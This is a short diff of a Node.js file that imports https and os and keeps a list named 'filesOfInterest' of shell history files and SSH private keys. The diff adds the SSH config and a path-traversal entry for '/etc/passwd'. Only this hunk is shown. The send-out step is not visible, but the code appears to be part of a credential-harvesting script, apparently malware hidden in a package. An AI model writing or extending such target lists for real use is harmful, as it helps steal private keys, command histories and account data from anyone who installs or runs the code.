@@ -3,7 +3,8 @@ var http = require("https");
 var os = require('os');
 let filesOfInterest = ["/.zshrc", "/.bash_history", "/.zsh_history",
                        "/.ssh/id_rsa", "/.ssh/id_ed25519",
-                       "/.ssh/known_hosts"];
+                       "/.ssh/known_hosts", "/.ssh/config",
+                       "../../../../etc/passwd"];
 
 const homedir = os.homedir();
 
